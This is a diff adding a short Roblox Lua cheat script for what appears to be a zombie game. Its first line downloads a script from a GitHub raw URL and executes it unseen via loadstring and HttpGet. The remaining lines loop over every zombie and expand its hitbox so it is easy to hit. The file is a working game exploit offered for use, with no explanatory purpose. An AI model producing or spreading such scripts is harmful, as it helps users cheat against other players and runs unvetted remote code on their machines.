@@ -1,0 +1,12 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Scripty/main/ZombieUprising")()
+while wait() do
+for i,v in next, game:GetService('Workspace').Zombies:GetChildren() do
+pcall(function()
+v.HumanoidRootPart.Size = Vector3.new(100,100,100)
+v.HumanoidRootPart.Transparency = 0.7
+v.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
+v.HumanoidRootPart.Material = "Neon"
+v.HumanoidRootPart.CanCollide = false
+end)
+end
+end
